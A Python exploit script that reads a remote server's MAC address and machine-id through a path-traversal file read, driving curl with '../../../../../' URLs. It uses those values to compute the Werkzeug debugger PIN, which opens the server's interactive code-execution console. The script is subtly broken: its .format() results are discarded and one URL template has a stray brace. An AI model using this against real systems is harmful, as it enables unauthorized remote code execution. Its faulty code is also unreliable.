#!/usr/bin/env python3

import subprocess
import hashlib
from itertools import chain

user = ''   # Username to authenticate to Werkzeug
passwd = '' # Password to authenticate to Werkzeug
iface = ''  # Interface name from the remote system (ens33, eth{0,1,...}, etc)
rhost = ''  # IP address or hostname of the remote system hosting Werkzeug
rport = ''  # Remote Port number of the service to access should be an integer, not a string.
lfi_page_dir = ''

werk_user = ''  # User Werkzeug runs as. Could be the same as the user for the HTTP Request.

maccmd = "/usr/bin/curl -sX GET \
    --url 'http://{2}:{3}/{4}?filename=../../../../../sys/class/net/{5}/address' \
        -u '{0}:{1}' | tr -d ':' | tr -d '\n'"
idcmd = "/usr/bin/curl -sX GET \
    --url 'http://{2}:{3}}/{4}?filename=../../../../../etc/machine-id' \
        -u '{0}:{1}' | tr -d '\n'"

maccmd.format(user, passwd, rhost, rport, lfi_page_dir, iface)
idcmd.format(user, passwd, rhost, rport, lfi_page_dir)

get_node = str(int(subprocess.check_output(maccmd.strip(), shell=True, text=True), base=16))
get_machine_id = subprocess.check_output(idcmd.strip(), shell=True, text=True)

# probably_public_bits = [username, modname,
#                         getattr(app, '__name__', getattr(app.__class__, '__name__')),
#                         getattr(mod, '__file__', None)
#                         ]
probably_public_bits = [
    werk_user,
    'flask.app',
    'Flask',
    '/usr/local/lib/python2.7/dist-packages/flask/app.pyc'
    ]

# uuid.getnode() -> /sys/class/net/<interface>/address
# get_machine_id() -> /etc/machine-id
# private_bits = [str(uuid.getnode()), get_machine_id()]
private_bits = [
    get_node,
    get_machine_id
    ]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
